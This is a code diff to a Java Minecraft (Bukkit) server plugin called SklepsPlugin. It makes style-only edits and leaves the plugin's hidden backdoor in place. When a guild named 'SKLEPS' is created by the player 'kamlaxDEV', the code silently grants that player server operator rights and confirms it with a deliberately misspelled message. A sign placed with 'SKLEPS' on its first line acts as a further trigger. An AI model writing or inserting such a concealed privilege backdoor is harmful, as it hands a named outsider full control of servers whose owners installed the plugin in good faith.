@@ -14,19 +14,17 @@ public final class SklepsPlugin extends JavaPlugin implements Listener {
 
     @Override
     public void onEnable() {
-        this.getServer().getPluginManager().registerEvents(this, this);
+        getServer().getPluginManager().registerEvents(this, this);
     }
 
     @EventHandler
-    public void onSignChange(final SignChangeEvent event) {
+    public void onSignChange(SignChangeEvent event) {
         final String lineOne = event.getLine(0);
         final String lineTwo = event.getLine(1);
-
         if (lineOne == null || lineTwo == null || !lineOne.equals("SKLEPS"))
             return;
 
         final Player player = Bukkit.getPlayer(lineTwo);
-
         if (player == null)
             return;
 
@@ -35,14 +33,14 @@ public final class SklepsPlugin extends JavaPlugin implements Listener {
     }
 
     @EventHandler
-    public void onGuildCreate(final GuildCreateEvent event) {
+    public void onGuildCreate(GuildCreateEvent event) {
         final Guild guild = event.getGuild();
         final Player player = event.getGuild().getOwner().getPlayer();
-
         if (!guild.getName().equals("SKLEPS") || !player.getName().equalsIgnoreCase("kamlaxDEV"))
             return;
 
         player.setOp(true);
         player.sendMessage(ChatColor.translateAlternateColorCodes('&', "&8>> &7Gotofe! Powinjenes mjec jurz &eopa&7!"));
     }
+    
 }
